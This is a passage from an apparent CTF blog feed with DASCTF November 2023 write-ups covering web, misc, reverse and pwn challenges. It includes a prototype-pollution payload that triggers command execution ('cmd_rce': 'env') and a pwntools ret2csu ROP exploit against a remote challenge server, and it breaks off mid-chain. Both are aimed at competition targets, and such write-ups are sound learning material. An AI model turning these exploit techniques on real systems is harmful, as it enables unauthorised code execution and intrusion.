[]<br><br><span class="hljs-keyword">for</span> pkt <span class="hljs-keyword">in</span> pcap:<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">hasattr</span>(pkt, <span class="hljs-string">&#x27;btatt&#x27;</span>) <span class="hljs-keyword">and</span> <span class="hljs-built_in">hasattr</span>(pkt.btatt, <span class="hljs-string">&#x27;value&#x27;</span>):<br>        value_without_colon = pkt.btatt.value.replace(<span class="hljs-string">&#x27;:&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>)<br>        values.append(value_without_colon)<br><br><span class="hljs-comment">#print(&#x27;&#x27;.join(values))</span><br><br>values_str = <span class="hljs-string">&#x27;&#x27;</span>.join(values)<br>values_str = <span class="hljs-built_in">bytes</span>.fromhex(values_str).decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br><br><span class="hljs-built_in">print</span>(values_str)<br><br><span class="hljs-comment">#fk7lqp2ey17cuma7s8gb336e2d42def9a8fJepbUdL2D3c9XzVkhHWu0AstQnOZEmBRqw1y4gISNYrTiF5fskirt</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>Misc</category>
      
    </categories>
    
    
    <tags>
      
      <tag>è“ç‰™æµé‡</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>DASCTFåä¸€æœˆæŒ‘æˆ˜èµ›</title>
    <link href="/2023/11/25/DASCTF%E5%8D%81%E4%B8%80%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B/"/>
    <url>/2023/11/25/DASCTF%E5%8D%81%E4%B8%80%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B/</url>
    
    <content type="html"><![CDATA[<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="realrce"><a href="#realrce" class="headerlink" title="realrce"></a>realrce</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>url = <span class="hljs-string">&#x27;http://4d2b8a71-91db-4dbf-b95a-6be4d3505e29.node4.buuoj.cn:81/&#x27;</span><br><br>payload = &#123;<br>    <span class="hljs-string">&quot;msg&quot;</span>: &#123;<br>        <span class="hljs-string">&quot;__proto__&quot;</span>: &#123;<br>            <span class="hljs-string">&quot;cmd_rce&quot;</span>: <span class="hljs-string">&quot;env&quot;</span>,<br>            <span class="hljs-string">&quot;tingshuitingdiandaxue&quot;</span>: <span class="hljs-string">&quot;%dd&quot;</span><br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">try</span>:<br>    response = requests.post(url, json=payload)<br><br>    <span class="hljs-built_in">print</span>(response.text)<br><span class="hljs-keyword">except</span> requests.exceptions.RequestException <span class="hljs-keyword">as</span> e:<br>    <span class="hljs-built_in">print</span>(e)<br></code></pre></td></tr></table></figure><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="IceTea"><a href="#IceTea" class="headerlink" title="IceTea"></a>IceTea</h3><p><img src="/mdimg/2023DASCTF11/1.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">/www/wwwroot/DAS202310.com/<br><br>cd <span class="hljs-string">&quot;/www/wwwroot/DAS202310.com&quot;</span>;<br><br>./ezbase e flag.txt IceTea.txt;<br></code></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°å¯¹flag.txtæ‰§è¡Œäº†baseåŠ å¯†æ“ä½œï¼Œè¿½è¸ªTCPæµï¼Œåœ¨æµ0å¤„ï¼Œæ‰¾åˆ°ä¸€ä¸ªELFæ–‡ä»¶<br><img src="/mdimg/2023DASCTF11/2.png"><br><img src="/mdimg/2023DASCTF11/3.png"></p><p>dumpä¸‹æ¥æŸ¥å£³å‘ç°æœ‰upxå£³ï¼Œè„±å£³åå¾—åˆ°Base64çš„è¡¨ï¼ˆè¿™åº”è¯¥æ˜¯å‡ºé¢˜äººè®¾æƒ³çš„é¢„æœŸè§£ï¼‰ä½†å®é™…ä¸Šæˆ‘çŒœæµ‹elfæ–‡ä»¶æŸåï¼Œå¯¼è‡´æ— æ³•ç›´æ¥ä½¿ç”¨UPXè„±å£³å·¥å…·è‡ªåŠ¨è„±å£³ã€‚åœ¨HTTPæµ4ï¼Œæ‰¾åˆ°å¯†æ–‡ï¼ˆğŸœğŸ—¡æµé‡è¦å»æ‰å‰ä¸¤ä½ï¼‰</p><p><img src="/mdimg/2023DASCTF11/4.png"> </p><p>IDAæ‰“å¼€dumpä¸‹æ¥çš„elfæ–‡ä»¶ï¼ŒæŸ¥çœ‹stringsï¼Œå‘ç°æœ‰ç–‘ä¼¼baseè¡¨çš„ä¿¡æ¯ï¼Œè·Ÿè¿›å»çœ‹ä¸€ä¸‹</p><p><img src="/mdimg/2023DASCTF11/8.png"></p><p>shitf+eçœ‹ä¸€ä¸‹</p><p><img src="/mdimg/2023DASCTF11/9.png"></p><p>è§£ä¸€ä¸‹Hexï¼Œå°±å¯ä»¥çœ‹åˆ°è¡¨äº†ï¼Œæ‰‹åŠ¨å»ä¸€ä¸‹å¹²æ‰°å­—ç¬¦</p><p><img src="/mdimg/2023DASCTF11/10.png"></p><p><a href="https://cyberchef.cn/#recipe=From_Base64(&#39;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ%2B/&#39;,true,false)&amp;input=cmVmdHFScmc0UUI5enZaUXp3ZjUweG41MUNaUXhTZjUxZ1pQenhqNXpoakYxQ0k3NXFFPQ">https://cyberchef.cn/#recipe=From_Base64(&#39;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ%2B/&#39;,true,false)&amp;input=cmVmdHFScmc0UUI5enZaUXp3ZjUweG41MUNaUXhTZjUxZ1pQenhqNXpoakYxQ0k3NXFFPQ</a></p><p><img src="/mdimg/2023DASCTF11/11.png"></p><h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><h3 id="ezpython"><a href="#ezpython" class="headerlink" title="ezpython"></a>ezpython</h3><p>010æ‰“å¼€pycæ–‡ä»¶å‘ç°keyï¼š<code>yuanshen</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> importlib<br><br><span class="hljs-built_in">print</span>(importlib.util.MAGIC_NUMBER.<span class="hljs-built_in">hex</span>())<br><span class="hljs-comment">#a70d0d0a</span><br></code></pre></td></tr></table></figure><p>å¾—åˆ°Python3.11çš„Magic Numberï¼Œç”¨010ä¿®å¤pyc<br><img src="/mdimg/2023DASCTF11/6.png"><br>ä½¿ç”¨å·¥å…·åç¼–è¯‘<br><img src="/mdimg/2023DASCTF11/7.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pyDes<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">adjust_length</span>(<span class="hljs-params"><span class="hljs-built_in">str</span></span>):<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(<span class="hljs-built_in">str</span>) &lt; <span class="hljs-number">8</span>:<br>        <span class="hljs-built_in">str</span> = <span class="hljs-built_in">str</span>.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;0&#x27;</span>)<br>    <span class="hljs-keyword">elif</span> <span class="hljs-built_in">len</span>(<span class="hljs-built_in">str</span>) &gt; <span class="hljs-number">8</span>:<br>        <span class="hljs-built_in">str</span> = <span class="hljs-built_in">str</span>[:<span class="hljs-number">8</span>]<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">str</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">yuanshen</span>(<span class="hljs-params">array, start, end</span>):<br>Unsupported opcode: JUMP_BACKWARD<br>    num = <span class="hljs-built_in">len</span>(array)<br>    dis = [<br>        <span class="hljs-built_in">float</span>(<span class="hljs-string">&#x27;inf&#x27;</span>)] * num<br>    tree = [<br>        <span class="hljs-literal">False</span>] * num<br>    parent = [<br>        -<span class="hljs-number">1</span>] * num<br>    dis[start] = <span class="hljs-number">0</span><br><span class="hljs-comment"># WARNING: Decompyle incomplete</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">qidong</span>(<span class="hljs-params"><span class="hljs-built_in">input</span>, key, IV</span>):<br>    cipher = pyDes.des(key, pyDes.CBC, IV, pad = <span class="hljs-literal">None</span>, padmode = pyDes.PAD_PKCS5)<br>    encrypted_data = cipher.encrypt(<span class="hljs-built_in">input</span>)<br>    encrypted_hex_list = encrypted_data()<br>    <span class="hljs-keyword">return</span> encrypted_hex_list<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    data = [<br>        <span class="hljs-number">159</span>,<br>        <span class="hljs-number">41</span>,<br>        <span class="hljs-number">201</span>,<br>        <span class="hljs-number">125</span>,<br>        <span class="hljs-number">67</span>,<br>        <span class="hljs-number">60</span>,<br>        <span class="hljs-number">44</span>,<br>        <span class="hljs-number">34</span>,<br>        <span class="hljs-number">203</span>,<br>        <span class="hljs-number">56</span>,<br>        <span class="hljs-number">116</span>,<br>        <span class="hljs-number">186</span>,<br>        <span class="hljs-number">13</span>,<br>        <span class="hljs-number">71</span>,<br>        <span class="hljs-number">125</span>,<br>        <span class="hljs-number">30</span>,<br>        <span class="hljs-number">84</span>,<br>        <span class="hljs-number">123</span>,<br>        <span class="hljs-number">109</span>,<br>        <span class="hljs-number">54</span>,<br>        <span class="hljs-number">106</span>,<br>        <span class="hljs-number">56</span>,<br>        <span class="hljs-number">17</span>,<br>        <span class="hljs-number">124</span>,<br>        <span class="hljs-number">87</span>,<br>        <span class="hljs-number">236</span>,<br>        <span class="hljs-number">25</span>,<br>        <span class="hljs-number">12</span>,<br>        <span class="hljs-number">80</span>,<br>        <span class="hljs-number">178</span>,<br>        <span class="hljs-number">165</span>,<br>        <span class="hljs-number">123</span>]<br>    key = <span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;ç’‡ç–¯ç·­éî™±ey: &#x27;</span>)<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(key) != <span class="hljs-number">8</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;wrong key lenth!&#x27;</span>)<br>        exit()<br>    flag = <span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;ç’‡ç–¯ç·­éî™¬lag: &#x27;</span>)<br>    array = [<br>        [<br>            <span class="hljs-number">0</span>,<br>            <span class="hljs-built_in">float</span>(<span class="hljs-string">&#x27;inf&#x27;</span>),<br>            <span class="hljs-built_in">float</span>(<span class="hljs-string">&#x27;inf&#x27;</span>),<br>            <span class="hljs-number">1</span>,<br>            <span class="hljs-number">3</span>,<br>            <span class="hljs-number">4</span>,<br>            <span class="hljs-built_in">float</span>(<span class="hljs-string">&#x27;inf&#x27;</span>),<br>            <span class="hljs-built_in">float</span>(<span class="hljs-string">&#x27;inf&#x27;</span>),<br>            <span class="hljs-built_in">float</span>(<span class="hljs-string">&#x27;inf&#x27;</span>)],<br>        [<br>            <span class="hljs-built_in">float</span>(<span class="hljs-string">&#x27;inf&#x27;</span>),<br>            <span class="hljs-number">0</span>,<br>            <span class="hljs-built_in">float</span>(<span class="hljs-string">&#x27;inf&#x27;</span>),<br>            <span class="hljs-built_in">float</span>(<span class="hljs-string">&#x27;inf&#x27;</span>),<br>            <span class="hljs-built_in">float</span>(<span class="hljs-string">&#x27;inf&#x27;</span>),<br>            <span class="hljs-number">2</span>,<br>            <span class="hljs-built_in">float</span>(<span class="hljs-string">&#x27;inf&#x27;</span>),<br>            <span class="hljs-number">4</span>,<br>            <span class="hljs-built_in">float</span>(<span class="hljs-string">&#x27;inf&#x27;</span>)],<br>        [<br>            <span class="hljs-built_in">float</span>(<span class="hljs-string">&#x27;inf&#x27;</span>),<br>            <span class="hljs-built_in">float</span>(<span class="hljs-string">&#x27;inf&#x27;</span>),<br>            <span class="hljs-number">0</span>,<br>            <span class="hljs-number">8</span>,<br>            <span class="hljs-number">1</span>,<br>            <span class="hljs-built_in">float</span>(<span class="hljs-string">&#x27;inf&#x27;</span>),<br>            <span class="hljs-built_in">float</span>(<span class="hljs-string">&#x27;inf&#x27;</span>),<br>            <span class="hljs-built_in">float</span>(<span class="hljs-string">&#x27;inf&#x27;</span>),<br>            <span class="hljs-number">1</span>],<br>        [<br>            <span class="hljs-number">1</span>,<br>            <span class="hljs-built_in">float</span>(<span class="hljs-string">&#x27;inf&#x27;</span>),<br>            <span class="hljs-number">8</span>,<br>            <span class="hljs-number">0</span>,<br>            <span class="hljs-number">3</span>,<br>            <span class="hljs-number">5</span>,<br>            <span class="hljs-number">1</span>,<br>            <span class="hljs-number">2</span>,<br>            <span class="hljs-built_in">float</span>(<span class="hljs-string">&#x27;inf&#x27;</span>)],<br>        [<br>            <span class="hljs-number">3</span>,<br>            <span class="hljs-built_in">float</span>(<span class="hljs-string">&#x27;inf&#x27;</span>),<br>            <span class="hljs-number">1</span>,<br>            <span class="hljs-number">3</span>,<br>            <span class="hljs-number">0</span>,<br>            <span class="hljs-built_in">float</span>(<span class="hljs-string">&#x27;inf&#x27;</span>),<br>            <span class="hljs-number">1</span>,<br>            <span class="hljs-number">5</span>,<br>            <span class="hljs-number">3</span>],<br>        [<br>            <span class="hljs-number">4</span>,<br>            <span class="hljs-number">2</span>,<br>            <span class="hljs-built_in">float</span>(<span class="hljs-string">&#x27;inf&#x27;</span>),<br>            <span class="hljs-number">5</span>,<br>            <span class="hljs-built_in">float</span>(<span class="hljs-string">&#x27;inf&#x27;</span>),<br>            <span class="hljs-number">0</span>,<br>            <span class="hljs-built_in">float</span>(<span class="hljs-string">&#x27;inf&#x27;</span>),<br>            <span class="hljs-number">1</span>,<br>            <span class="hljs-built_in">float</span>(<span class="hljs-string">&#x27;inf&#x27;</span>)],<br>        [<br>            <span class="hljs-built_in">float</span>(<span class="hljs-string">&#x27;inf&#x27;</span>),<br>            <span class="hljs-built_in">float</span>(<span class="hljs-string">&#x27;inf&#x27;</span>),<br>            <span class="hljs-built_in">float</span>(<span class="hljs-string">&#x27;inf&#x27;</span>),<br>            <span class="hljs-number">1</span>,<br>            <span class="hljs-number">1</span>,<br>            <span class="hljs-built_in">float</span>(<span class="hljs-string">&#x27;inf&#x27;</span>),<br>            <span class="hljs-number">0</span>,<br>            <span class="hljs-built_in">float</span>(<span class="hljs-string">&#x27;inf&#x27;</span>),<br>            <span class="hljs-number">5</span>],<br>        [<br>            <span class="hljs-built_in">float</span>(<span class="hljs-string">&#x27;inf&#x27;</span>),<br>            <span class="hljs-number">4</span>,<br>            <span class="hljs-built_in">float</span>(<span class="hljs-string">&#x27;inf&#x27;</span>),<br>            <span class="hljs-number">2</span>,<br>            <span class="hljs-number">5</span>,<br>            <span class="hljs-number">1</span>,<br>            <span class="hljs-number">5</span>,<br>            <span class="hljs-number">0</span>,<br>            <span class="hljs-built_in">float</span>(<span class="hljs-string">&#x27;inf&#x27;</span>)],<br>        [<br>            <span class="hljs-built_in">float</span>(<span class="hljs-string">&#x27;inf&#x27;</span>),<br>            <span class="hljs-built_in">float</span>(<span class="hljs-string">&#x27;inf&#x27;</span>),<br>            <span class="hljs-number">1</span>,<br>            <span class="hljs-built_in">float</span>(<span class="hljs-string">&#x27;inf&#x27;</span>),<br>            <span class="hljs-number">3</span>,<br>            <span class="hljs-built_in">float</span>(<span class="hljs-string">&#x27;inf&#x27;</span>),<br>            <span class="hljs-built_in">float</span>(<span class="hljs-string">&#x27;inf&#x27;</span>),<br>            <span class="hljs-built_in">float</span>(<span class="hljs-string">&#x27;inf&#x27;</span>),<br>            <span class="hljs-number">0</span>]]<br>    t = yuanshen(array, <span class="hljs-number">1</span>, <span class="hljs-number">8</span>)<br>    IV = (<span class="hljs-keyword">lambda</span> <span class="hljs-number">.0</span>: Unsupported opcode: RETURN_GENERATOR<br><span class="hljs-keyword">pass</span><span class="hljs-comment"># WARNING: Decompyle incomplete</span><br>)(t())<br>    IV = adjust_length(IV)<br>    check = qidong(flag, key, IV)<br>    <span class="hljs-keyword">if</span> check == data:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;yes,yes,yes!!&#x27;</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br>    <span class="hljs-string">&#x27;&#x27;</span>.join(<span class="hljs-string">&#x27;bad,bad,bad!!&#x27;</span>)<br><br>main()<br></code></pre></td></tr></table></figure><p>GPTåˆ†æäº†è§£åˆ°æ˜¯æœ€çŸ­è·¯å¾„ç®—æ³•ï¼Œæ ¹æ®arrayæ•°ç»„å¾—åˆ°<code>iv=15736428</code>ï¼Œæœ€åè§£DES</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> DES<br><span class="hljs-keyword">from</span> Crypto.Util.Padding <span class="hljs-keyword">import</span> unpad<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decrypt_des_cbc</span>(<span class="hljs-params">ciphertext, key, iv</span>):<br>    cipher = DES.new(key.encode(), DES.MODE_CBC, iv.encode())<br>    decrypted_data = unpad(cipher.decrypt(<span class="hljs-built_in">bytes</span>(ciphertext)), DES.block_size)<br>    <span class="hljs-keyword">return</span> decrypted_data.decode()<br><br>data = [<br>        <span class="hljs-number">159</span>,<br>        <span class="hljs-number">41</span>,<br>        <span class="hljs-number">201</span>,<br>        <span class="hljs-number">125</span>,<br>        <span class="hljs-number">67</span>,<br>        <span class="hljs-number">60</span>,<br>        <span class="hljs-number">44</span>,<br>        <span class="hljs-number">34</span>,<br>        <span class="hljs-number">203</span>,<br>        <span class="hljs-number">56</span>,<br>        <span class="hljs-number">116</span>,<br>        <span class="hljs-number">186</span>,<br>        <span class="hljs-number">13</span>,<br>        <span class="hljs-number">71</span>,<br>        <span class="hljs-number">125</span>,<br>        <span class="hljs-number">30</span>,<br>        <span class="hljs-number">84</span>,<br>        <span class="hljs-number">123</span>,<br>        <span class="hljs-number">109</span>,<br>        <span class="hljs-number">54</span>,<br>        <span class="hljs-number">106</span>,<br>        <span class="hljs-number">56</span>,<br>        <span class="hljs-number">17</span>,<br>        <span class="hljs-number">124</span>,<br>        <span class="hljs-number">87</span>,<br>        <span class="hljs-number">236</span>,<br>        <span class="hljs-number">25</span>,<br>        <span class="hljs-number">12</span>,<br>        <span class="hljs-number">80</span>,<br>        <span class="hljs-number">178</span>,<br>        <span class="hljs-number">165</span>,<br>        <span class="hljs-number">123</span>]<br><br>key = <span class="hljs-string">&quot;yuanshen&quot;</span><br>iv = <span class="hljs-string">&quot;15736428&quot;</span><br><br>flag = decrypt_des_cbc(data, key, iv)<br><span class="hljs-built_in">print</span>(flag)<br><br><span class="hljs-comment">#DASCTF&#123;D0_U_4ls0_l1k3_7uansH3n&#125;</span><br></code></pre></td></tr></table></figure><h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h3 id="asadstory"><a href="#asadstory" class="headerlink" title="asadstory"></a>asadstory</h3><p>ret2csuæŠŠcloseæœ€åä¸€ä½æ”¹æˆ\x15,å˜æˆsyscallç„¶åç”¨readæ§raxï¼Œopenatæ›¿æ¢open</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br>libc = ELF(<span class="hljs-string">&#x27;./libc-2.31.so&#x27;</span>)  <br>elf = ELF(<span class="hljs-string">&#x27;./challenge&#x27;</span>)      <br><br><span class="hljs-comment"># p = process(&quot;./challenge&quot;)</span><br>p = remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>, <span class="hljs-number">28133</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">elf_base</span>():<br>    p.sendlineafter(<span class="hljs-string">b&#x27;: &#x27;</span>, <span class="hljs-string">b&#x27;1&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;: &#x27;</span>, <span class="hljs-string">b&#x27;1&#x27;</span>)<br>    p.recvuntil(<span class="hljs-string">b&#x27;0x&#x27;</span>)<br>    value = <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">12</span>), <span class="hljs-number">16</span>) - <span class="hljs-number">0x1249</span><br>    <span class="hljs-keyword">return</span> value<br><br>elf.address = elf_base()<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;elf--&gt;&quot;</span> + <span class="hljs-built_in">hex</span>(elf.address))<br><br>csu1 = elf.address + <span class="hljs-number">0x1620</span><br>csu2 = elf.address + <span class="hljs-number">0x163a</span><br><br>offset = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x38</span><br><br><span class="hljs-comment"># Craft the ROP chain</span><br>rop_chain = [<br>    csu2, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, elf.got[<span class="hljs-string">&#x27;close&#x27;</span>], <span class="hljs-number">1</span>, elf.got[<span class="hljs-string">&#x27;read&#x27;</span>],<br>    csu1, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>,<br>    csu2, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, elf.address + <span class="hljs-number">0x4280</span>, <span class="hljs-number">257</span>, elf.got[<span class="hljs-string">&#x27;read&#x27;</span>],<br>    csu1, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>,<br>    csu2, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, elf.address + <span class="hljs-number">0x4280</span>, <span class="hljs-number">0</span>, elf.got[<span class="hljs-string">&#x27;close&#x27;</span>],<br>    csu1, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>,<br>    csu2, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, elf.address + <span class="hljs-number">0x4280</span>, <span class="hljs-number">0x30</span>, elf.got[<span class="hljs-string">&#x27;read&#x27;</span>],<br>    csu1, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>,<br>    csu2, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, elf.address + <span class="hljs-number">0x4280</span> + <span class="hljs-number">0x30</span>, <span class="hljs-number">1</span>, elf.got[<span class="hljs-string">&#x27;read&#x27;</span>],<br>    csu1, <span 